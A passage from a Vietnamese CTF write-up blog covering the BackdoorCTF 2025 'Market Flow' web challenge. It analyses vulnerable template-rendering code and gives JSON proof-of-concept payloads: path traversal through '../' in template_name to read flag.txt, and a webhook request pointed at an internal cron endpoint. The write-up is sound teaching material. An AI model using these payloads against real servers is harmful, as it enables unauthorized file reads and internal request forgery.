<li>Ta phân tích tiếp class <code>TemplateRenderer</code> và hàm <code>render</code>:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br><span class="line">52</span><br><span class="line">53</span><br><span class="line">54</span><br><span class="line">55</span><br><span class="line">56</span><br><span class="line">57</span><br><span class="line">58</span><br><span class="line">59</span><br><span class="line">60</span><br><span class="line">61</span><br><span class="line">62</span><br><span class="line">63</span><br><span class="line">64</span><br><span class="line">65</span><br><span class="line">66</span><br><span class="line">67</span><br><span class="line">68</span><br><span class="line">69</span><br><span class="line">70</span><br><span class="line">71</span><br><span class="line">72</span><br><span class="line">73</span><br><span class="line">74</span><br><span class="line">75</span><br><span class="line">76</span><br><span class="line">77</span><br><span class="line">78</span><br><span class="line">79</span><br><span class="line">80</span><br><span class="line">81</span><br><span class="line">82</span><br><span class="line">83</span><br><span class="line">84</span><br><span class="line">85</span><br><span class="line">86</span><br><span class="line">87</span><br><span class="line">88</span><br><span class="line">89</span><br><span class="line">90</span><br><span class="line">91</span><br><span class="line">92</span><br><span class="line">93</span><br></pre></td><td class="code"><pre><span class="line"><span class="keyword">import</span> os</span><br><span class="line"><span class="keyword">import</span> json</span><br><span class="line"></span><br><span class="line"><span class="keyword">class</span> <span class="title class_">TemplateRenderer</span>:</span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">__init__</span>(<span class="params">self</span>):</span><br><span class="line">        <span class="variable language_">self</span>.template_dir = <span class="string">&#x27;/var/tmp/sessionmaze/templates&#x27;</span></span><br><span class="line">        os.makedirs(<span class="variable language_">self</span>.template_dir, exist_ok=<span class="literal">True</span>)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">validate</span>(<span class="params">self, template_spec</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;template_name&#x27;</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Template specification missing template_name&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        template_path = os.path.join(<span class="variable language_">self</span>.template_dir, template_spec.template_name)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> os.path.exists(template_path):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">f&quot;Template not found: <span class="subst">&#123;template_spec.template_name&#125;</span>&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> <span class="literal">True</span></span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">render</span>(<span class="params">self, template_spec</span>):</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> <span class="built_in">hasattr</span>(template_spec, <span class="string">&#x27;template_name&#x27;</span>):</span><br><span class="line">            <span class="keyword">raise</span> ValueError(<span class="string">&quot;Template specification missing template_name&quot;</span>)</span><br><span class="line">        </span><br><span class="line">        template_path = os.path.join(<span class="variable language_">self</span>.template_dir, template_spec.template_name)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> template_path.endswith(<span class="string">&#x27;.tpl&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._render_legacy_template(template_path, template_spec)</span><br><span class="line">        <span class="keyword">else</span>:</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._render_safe_template(template_path, template_spec)</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_render_safe_template</span>(<span class="params">self, template_path, spec</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(template_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            template_content = f.read()</span><br><span class="line">        </span><br><span class="line">        variables = <span class="built_in">getattr</span>(spec, <span class="string">&#x27;variables&#x27;</span>, &#123;&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> variables.items():</span><br><span class="line">            placeholder = <span class="string">f&quot;&#123;&#123;&#123;&#123;<span class="subst">&#123;key&#125;</span>&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">            template_content = template_content.replace(placeholder, <span class="built_in">str</span>(value))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> template_content</span><br><span class="line">    </span><br><span class="line">    <span class="keyword">def</span> <span class="title function_">_render_legacy_template</span>(<span class="params">self, template_path, spec</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(template_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            template_content = f.read()</span><br><span class="line">        </span><br><span class="line">        lines = template_content.split(<span class="string">&#x27;\n&#x27;</span>)</span><br><span class="line">        <span class="keyword">if</span> <span class="keyword">not</span> lines <span class="keyword">or</span> <span class="keyword">not</span> lines[<span class="number">0</span>].strip().startswith(<span class="string">&#x27;# -*- mode: legacy -*-&#x27;</span>):</span><br><span class="line">            <span class="keyword">return</span> <span class="variable language_">self</span>._render_safe_template(template_path, spec)</span><br><span class="line">        </span><br><span class="line">        variables = <span class="built_in">getattr</span>(spec, <span class="string">&#x27;variables&#x27;</span>, &#123;&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> variables.items():</span><br><span class="line">            placeholder = <span class="string">f&quot;&#123;&#123;&#123;&#123;<span class="subst">&#123;key&#125;</span>&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">            template_content = template_content.replace(placeholder, <span class="built_in">str</span>(value))</span><br><span class="line">        </span><br><span class="line">        config_data = &#123;&#125;</span><br><span class="line">        output = []</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> line <span class="keyword">in</span> template_content.split(<span class="string">&#x27;\n&#x27;</span>):</span><br><span class="line">            <span class="keyword">if</span> line.strip().startswith(<span class="string">&#x27;@config:&#x27;</span>):</span><br><span class="line">                config_path = line.strip()[<span class="number">8</span>:].strip()</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> os.path.exists(config_path):</span><br><span class="line">                    <span class="keyword">try</span>:</span><br><span class="line">                        <span class="keyword">with</span> <span class="built_in">open</span>(config_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> cf:</span><br><span class="line">                            content = cf.read()</span><br><span class="line">                            <span class="keyword">try</span>:</span><br><span class="line">                                parsed = json.loads(content)</span><br><span class="line">                                config_data.update(parsed)</span><br><span class="line">                            <span class="keyword">except</span> json.JSONDecodeError:</span><br><span class="line">                                config_data[config_path] = content</span><br><span class="line">                    <span class="keyword">except</span> Exception <span class="keyword">as</span> e:</span><br><span class="line">                        config_data[config_path] = <span class="string">f&quot;Error: <span class="subst">&#123;<span class="built_in">str</span>(e)&#125;</span>&quot;</span></span><br><span class="line">            </span><br><span class="line">            <span class="keyword">elif</span> line.strip().startswith(<span class="string">&#x27;@include:&#x27;</span>):</span><br><span class="line">                include_path = line.strip()[<span class="number">9</span>:].strip()</span><br><span class="line">                include_full_path = os.path.join(<span class="variable language_">self</span>.template_dir, include_path)</span><br><span class="line">                </span><br><span class="line">                <span class="keyword">if</span> os.path.exists(include_full_path):</span><br><span class="line">                    <span class="keyword">with</span> <span class="built_in">open</span>(include_full_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">                        output.append(f.read())</span><br><span class="line">            </span><br><span class="line">            <span class="keyword">else</span>:</span><br><span class="line">                output.append(line)</span><br><span class="line">        </span><br><span class="line">        result = <span class="string">&#x27;\n&#x27;</span>.join(output)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">if</span> config_data:</span><br><span class="line">            config_section = <span class="string">f&quot;&lt;!-- Configuration Data:\n<span class="subst">&#123;json.dumps(config_data, indent=<span class="number">2</span>)&#125;</span>\n--&gt;\n&quot;</span></span><br><span class="line">            result = config_section + result</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> result</span><br></pre></td></tr></table></figure>

<ul>
<li>Có hai chế độ đọc file là <code>_render_safe_template</code> và <code>_render_legacy_template</code> thì bây giờ chỉ cần quan tâm đến <code>_render_safe_template</code>:</li>
</ul>
<figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br></pre></td><td class="code"><pre><span class="line"><span class="variable language_">self</span>.template_dir = <span class="string">&#x27;/var/tmp/sessionmaze/templates&#x27;</span></span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line">template_path = os.path.join(<span class="variable language_">self</span>.template_dir, template_spec.template_name)</span><br><span class="line"></span><br><span class="line">...</span><br><span class="line"></span><br><span class="line"><span class="keyword">def</span> <span class="title function_">_render_safe_template</span>(<span class="params">self, template_path, spec</span>):</span><br><span class="line">        <span class="keyword">with</span> <span class="built_in">open</span>(template_path, <span class="string">&#x27;r&#x27;</span>) <span class="keyword">as</span> f:</span><br><span class="line">            template_content = f.read()</span><br><span class="line">        </span><br><span class="line">        variables = <span class="built_in">getattr</span>(spec, <span class="string">&#x27;variables&#x27;</span>, &#123;&#125;)</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">for</span> key, value <span class="keyword">in</span> variables.items():</span><br><span class="line">            placeholder = <span class="string">f&quot;&#123;&#123;&#123;&#123;<span class="subst">&#123;key&#125;</span>&#125;&#125;&#125;&#125;&quot;</span></span><br><span class="line">            template_content = template_content.replace(placeholder, <span class="built_in">str</span>(value))</span><br><span class="line">        </span><br><span class="line">        <span class="keyword">return</span> template_content</span><br></pre></td></tr></table></figure>

<ul>
<li><code>template_path</code> do người dùng toàn quyền kiểm soát nên nếu nó chứa <code>../../../../../flag.txt</code> ta hoàn toàn có thể đọc flag.</li>
</ul>
<h2 id="2-PoC-cho-challenge-2"><a href="#2-PoC-cho-challenge-2" class="headerlink" title="2. PoC cho challenge:"></a>2. PoC cho challenge:</h2><ul>
<li>Ở api <code>/api/analytics/reports</code>, ta gửi payload json:</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;ReportConfiguration&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;report_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;campaign_performance&quot;</span><span class="punctuation">,</span><span class="attr">&quot;date_range&quot;</span><span class="punctuation">:</span><span class="string">&quot;last_7_days&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;template&quot;</span><span class="punctuation">:</span><span class="punctuation">&#123;</span></span><br><span class="line">        <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;TemplateSpecification&quot;</span><span class="punctuation">,</span></span><br><span class="line">        <span class="attr">&quot;template_name&quot;</span><span class="punctuation">:</span><span class="string">&quot;../../../../../../../../flag.txt&quot;</span></span><br><span class="line">    <span class="punctuation">&#125;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/ctf/backdoor/7.png" alt="image-7"></p>
<ul>
<li><p>Nhận được path report là: <code>/reports/6korZtDcliD6M2k0XInChV2cDRpAnUr8NizuKXA7s3s.html</code>.</p>
</li>
<li><p>Kế tiếp, gửi payload json sau tại api <code>/api/webhooks/forward</code> để đọc file <code>flag.txt</code> ghi nội dung vào <code>/reports/6korZtDcliD6M2k0XInChV2cDRpAnUr8NizuKXA7s3s.html</code>.</p>
</li>
</ul>
<figure class="highlight json"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><span class="line"><span class="punctuation">&#123;</span></span><br><span class="line">    <span class="attr">&quot;_type&quot;</span><span class="punctuation">:</span><span class="string">&quot;WebhookForwarder&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;target_url&quot;</span><span class="punctuation">:</span><span class="string">&quot;http://localh.st:5000/internal/cron/process&quot;</span><span class="punctuation">,</span></span><br><span class="line">    <span class="attr">&quot;method&quot;</span><span class="punctuation">:</span><span class="string">&quot;POST&quot;</span></span><br><span class="line"><span class="punctuation">&#125;</span></span><br></pre></td></tr></table></figure>

<p><img src="/img/ctf/backdoor/8.png" alt="image-8"></p>
<ul>
<li>Cuối cùng truy cập <code>/reports/6korZtDcliD6M2k0XInChV2cDRpAnUr8NizuKXA7s3s.html</code> để lấy flag.</li>
</ul>
<p><img src="/img/ctf/backdoor/9.png" alt="image-9"></p>
</article><div class="post-copyright"><div class="post-copyright__author"><span class="post-copyright-meta"><i class="fas fa-circle-user fa-fw"></i>Author: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io">H00d1eBl4ck</a></span></div><div class="post-copyright__type"><span class="post-copyright-meta"><i class="fas fa-square-arrow-up-right fa-fw"></i>Link: </span><span class="post-copyright-info"><a href="https://elliotbigfan.github.io/2025/12/08/2025/ctf/backdoorCTF/wu/">https://elliotbigfan.github.io/2025/12/08/2025/ctf/backdoorCTF/wu/</a></span></div><div class="post-copyright__notice"><span class="post-copyright-meta"><i class="fas fa-circle-exclamation fa-fw"></i>Copyright Notice: </span><span class="post-copyright-info">All articles on this blog are licensed under <a target="_blank" rel="noopener" href="https://creativecommons.org/licenses/by-nc-sa/4.0/">CC BY-NC-SA 4.0</a> unless otherwise stated.</span></div></div><div class="tag_share"><div class="post-meta__tag-list"><a class="post-meta__tags" href="/tags/CTF/">CTF</a><a class="post-meta__tags" href="/tags/Web/">Web</a><a class="post-meta__tags" href="/tags/Pwn/">Pwn</a></div><div class="post-share"><div class="social-share" data-image="/img/ctf/backdoor/logo.png" data-sites="facebook,twitter,wechat,weibo,qq"></div><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/css/share.min.css" media="print" onload="this.media='all'"><script src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/sharejs/dist/js/social-share.min.js" defer></script></div></div><nav class="pagination-post" id="pagination"><a class="pagination-related full-width" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" onerror="onerror=null;src='/img/404.jpg'" alt="cover of next post"><div class="info text-right"><div class="info-1"><div class="info-item-1">Next</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a></nav><div class="relatedPosts"><div class="headline"><i class="fas fa-thumbs-up fa-fw"></i><span>Related Articles</span></div><div class="relatedPosts-list"><a class="pagination-related" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img class="cover" src="/img/ctf/lakectf/poster.webp" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-12-01</div><div class="info-item-2">Writeup: LakeCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Challenge: Gamblecore Dạng challenge này tác giả thiết kế mang thiên hướng RNG + bug (RNG: Random Number Generator) nên sẽ mang tính may rủi rất cao đúng như tên gọi của challenge:&gt; Phân tích qua file server.js, file xử lý chính của challenge:  123456789101112131415161718192021222324252627282930313233343536373839404142434445464748495051525354555657585960616263646566676869707172737475767778798081828384858687888990app.get(&#x27;/api/balance&#x27;, (req, res) =&gt; &#123;    res.json(&#...</div></div></div></a><a class="pagination-related" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img class="cover" src="/img/ctf/infobahn/poster.png" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-11-11</div><div class="info-item-2">Writeup: Infobahn 2025</div></div><div class="info-2"><div class="info-item-1">Beginner (Web) | Challenge: Bitset, Bitsets và Bitsetsy Các challenges này tác giả đã cố tình để unintended :&gt;   Mình chỉ cần truy cập /run.sh là lấy đc flag cho cả 3 bài :&gt;    Ở các challenge revenge sau sẽ bỏ đi unintended này và cần phải hack thật sự.  Beginner (Web) | Challenge: Bitset-revenge, Bitsets-revengeBitset-revenge Chall này validate không an toàn ở param url và truyền giá trị url này vào thuộc tính src của tag img dẫn đến kẻ tấn công có thể bypass và gây ra xss lấy flag đư...</div></div></div></a><a class="pagination-related" href="/2025/09/25/2025/ctf/cyberconDTU/writeup/" title="Writeup: cyberconDTU 2025"><img class="cover" src="/img/ctf/cybercon/poster_cybercon.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-09-25</div><div class="info-item-2">Writeup: cyberconDTU 2025</div></div><div class="info-2"><div class="info-item-1">Web | Safe upload file1. Phân tích mã nguồn và ý tưởng Đọc qua file .yar (validate file upload), ta có thể thấy các file khi đc upload lên server sẽ được file .yar này validate rất chặt và gần như không thể bypass để upload webshell được. Tuy nhiên, khi phân tích file upload.php ta có thể thấy một số đoạn code xử lý không hợp lý và dẫn đến upload file race condition.  1234567891011// move file vào thư mục $tmp_path(/var/www/html/tmp) if (!move_uploaded_file($_FILES[&#x27;file&#x27;][&#x27;tmp...</div></div></div></a><a class="pagination-related" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img class="cover" src="/img/ctf/holactf/poster.jpg" alt="cover"><div class="info text-center"><div class="info-1"><div class="info-item-1"><i class="far fa-calendar-alt fa-fw"></i> 2025-10-02</div><div class="info-item-2">Writeup: HolaCTF 2025</div></div><div class="info-2"><div class="info-item-1">Web | Hell EHCIntroduction Đây là một challenge liên quan đến lỗ hổng Deserialization và Wrapper phar:&#x2F;&#x2F; trong PHP (PHP Phar deserialization) Link tải challenge: hell-ehc Cách chạy challenge:  12345# 1. build imagedocker build -t hell_ehc .# 2. Run containerdocker run -it --rm -p 5005:80 hell_ehc  Solution1. Xác định vị trí xảy ra lỗi bảo mật trong mã nguồn Vì challenge có cho tính năng upload file nên ta sẽ thử kiểm tra liệu có thể tận dụng điều này để upload trực tiếp webshell và ...</div></div></div></a></div></div></div><div class="aside-content" id="aside-content"><div class="card-widget card-info text-center"><div class="avatar-img"><img src="/img/favicon_io/android-chrome-192x192.png" onerror="this.onerror=null;this.src='/img/friend_404.gif'" alt="avatar"/></div><div class="author-info-name">H00d1eBl4ck</div><div class="author-info-description">Thuan Le</div><div class="site-data"><a href="/archives/"><div class="headline">Articles</div><div class="length-num">7</div></a><a href="/tags/"><div class="headline">Tags</div><div class="length-num">7</div></a><a href="/categories/"><div class="headline">Categories</div><div class="length-num">9</div></a></div><a id="card-info-btn" target="_blank" rel="noopener" href="https://github.com/ElliotBigFan"><i class="fab fa-github"></i><span>Follow Me</span></a><div class="card-info-social-icons"><a class="social-icon" href="https://github.com/ElliotBigFan" target="_blank" title="Github"><i class="fab fa-github" style="color: #24292e;"></i></a></div></div><div class="card-widget card-announcement"><div class="item-headline"><i class="fas fa-bullhorn fa-shake"></i><span>Announcement</span></div><div class="announcement_content">I'm trying to be better</div></div><div class="sticky_layout"><div class="card-widget" id="card-toc"><div class="item-headline"><i class="fas fa-stream"></i><span>Contents</span><span class="toc-percentage"></span></div><div class="toc-content"><ol class="toc"><li class="toc-item toc-level-1"><a class="toc-link" href="#Pwn-Challenge-Devil%E2%80%99s-Convergence"><span class="toc-number">1.</span> <span class="toc-text">Pwn | Challenge: Devil’s Convergence</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Phan-tich-chuong-trinh"><span class="toc-number">1.1.</span> <span class="toc-text">1. Phân tích chương trình:</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-Script-Python-de-exploit"><span class="toc-number">1.2.</span> <span class="toc-text">2. Script Python để exploit:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Challenge-Flask-of-Cookies"><span class="toc-number">2.</span> <span class="toc-text">Web | Challenge: Flask of Cookies</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Phan-tich-ma-nguon"><span class="toc-number">2.1.</span> <span class="toc-text">1. Phân tích mã nguồn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PoC-cho-challenge"><span class="toc-number">2.2.</span> <span class="toc-text">2. PoC cho challenge:</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Challenge-Image-Gallery"><span class="toc-number">3.</span> <span class="toc-text">Web | Challenge: Image Gallery</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Phan-tich-ma-nguon-1"><span class="toc-number">3.1.</span> <span class="toc-text">1. Phân tích mã nguồn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PoC-cho-challenge-1"><span class="toc-number">3.2.</span> <span class="toc-text">2. PoC cho challenge</span></a></li></ol></li><li class="toc-item toc-level-1"><a class="toc-link" href="#Web-Challenge-Market-Flow"><span class="toc-number">4.</span> <span class="toc-text">Web | Challenge: Market Flow</span></a><ol class="toc-child"><li class="toc-item toc-level-2"><a class="toc-link" href="#1-Phan-tich-ma-nguon-2"><span class="toc-number">4.1.</span> <span class="toc-text">1. Phân tích mã nguồn</span></a></li><li class="toc-item toc-level-2"><a class="toc-link" href="#2-PoC-cho-challenge-2"><span class="toc-number">4.2.</span> <span class="toc-text">2. PoC cho challenge:</span></a></li></ol></li></ol></div></div><div class="card-widget card-recent-post"><div class="item-headline"><i class="fas fa-history"></i><span>Recent Posts</span></div><div class="aside-list"><div class="aside-list-item"><a class="thumbnail" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025"><img src="/img/ctf/backdoor/logo.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: BackdoorCTF 2025"/></a><div class="content"><a class="title" href="/2025/12/08/2025/ctf/backdoorCTF/wu/" title="Writeup: BackdoorCTF 2025">Writeup: BackdoorCTF 2025</a><time datetime="2025-12-08T10:37:33.000Z" title="Created 2025-12-08 17:37:33">2025-12-08</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025"><img src="/img/ctf/lakectf/poster.webp" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: LakeCTF 2025"/></a><div class="content"><a class="title" href="/2025/12/01/2025/ctf/LakeCTF/wu/" title="Writeup: LakeCTF 2025">Writeup: LakeCTF 2025</a><time datetime="2025-12-01T07:09:56.000Z" title="Created 2025-12-01 14:09:56">2025-12-01</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025"><img src="/img/ctf/infobahn/poster.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: Infobahn 2025"/></a><div class="content"><a class="title" href="/2025/11/11/2025/ctf/Infobahn/wu/" title="Writeup: Infobahn 2025">Writeup: Infobahn 2025</a><time datetime="2025-11-11T03:31:26.000Z" title="Created 2025-11-11 10:31:26">2025-11-11</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025"><img src="/img/ctf/holactf/poster.jpg" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Writeup: HolaCTF 2025"/></a><div class="content"><a class="title" href="/2025/10/02/2025/ctf/holactf/writeup/" title="Writeup: HolaCTF 2025">Writeup: HolaCTF 2025</a><time datetime="2025-10-02T07:18:22.000Z" title="Created 2025-10-02 14:18:22">2025-10-02</time></div></div><div class="aside-list-item"><a class="thumbnail" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)"><img src="/img/experience/xss.png" onerror="this.onerror=null;this.src='/img/404.jpg'" alt="Experience: Cross Side Script (XSS)"/></a><div class="content"><a class="title" href="/2025/09/27/Experiences/XSS/xss/" title="Experience: Cross Side Script (XSS)">Experience: Cross Side Script (XSS)</a><time datetime="2025-09-27T11:12:56.000Z" title="Created 2025-09-27 18:12:56">2025-09-27</time></div></div></div></div></div></div></main><footer id="footer" style="background-image: url(/img/ctf/backdoor/logo.png);"><div class="footer-other"><div class="footer-copyright"><span class="copyright">&copy;&nbsp;2025 By H00d1eBl4ck</span></div></div></footer></div><div id="rightside"><div id="rightside-config-hide"><button id="readmode" type="button" title="Reading Mode"><i class="fas fa-book-open"></i></button><button id="darkmode" type="button" title="Toggle Between Light and Dark Mode"><i class="fas fa-adjust"></i></button><button id="hide-aside-btn" type="button" title="Toggle Between Single-column and Double-column"><i class="fas fa-arrows-alt-h"></i></button></div><div id="rightside-config-show"><button id="rightside-config" type="button" title="Settings"><i class="fas fa-cog fa-spin"></i></button><button class="close" id="mobile-toc-button" type="button" title="Table of Contents"><i class="fas fa-list-ul"></i></button><button id="go-up" type="button" title="Back to Top"><span class="scroll-percent"></span><i class="fas fa-arrow-up"></i></button></div></div><div><script src="/js/utils.js"></script><script src="/js/main.js"></script><div class="js-pjax"></div><script id="canvas_nest" defer="defer" color="0,0,255" opacity="1" zIndex="-1" count="99" mobile="false" src="https://cdn.jsdelivr.net/npm/butterfly-extsrc/dist/canvas-nest.min.js"></script><script async data-pjax src="//busuanzi.ibruce.info/busuanzi/2.3/busuanzi.pure.mini.js"></script></div></body></html>